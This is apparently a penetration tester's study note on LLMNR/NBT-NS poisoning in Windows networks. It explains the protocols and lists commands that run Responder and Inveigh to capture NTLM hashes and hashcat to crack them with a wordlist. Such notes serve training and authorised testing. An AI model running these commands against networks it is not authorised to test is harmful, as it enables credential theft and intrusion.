---
tags: [ad, windows, ntlm, llmnr]
aliases: [LLMNR/NBT-NS Poisoning]
---
# From Linux

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Server (NBT-NS) are Windows components that server as alternate methods of host identification that can be used when DNS fails. LLMNR is based off DNS and allows hosts on the same local link to perform name resolution using UDP/5355. If LLMNR fails then NBT-NS will be used by identifying system on a local network by their NetBIOS name using UDP/137. 

Any host on the network can reply to LLMNR/NBT-NS requests. We poison these requests via Responder by spoofing authoritative name resolution source. We need to get the victims to communicate with our system. The goal is to capture NTLMv1 and NTLMv2 password hashes which are used to authenticate. 

```shell
# start responder with default settings
sudo responder -I ens224

# cracking a captured hash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

# From Windows

If we use a Windows host as our attack box, the tool Inveigh works similar to Responder, but is written in Powershell and C#. 

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

# start with LLMNR and NBNS
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# if using the C# Inveigh
.\Inveigh.exe
```

## Related

- [[firewall-and-ids-evasion]]
- [[dns-attacks]]
- [[smb-attacks]]
- [[host-discovery]]

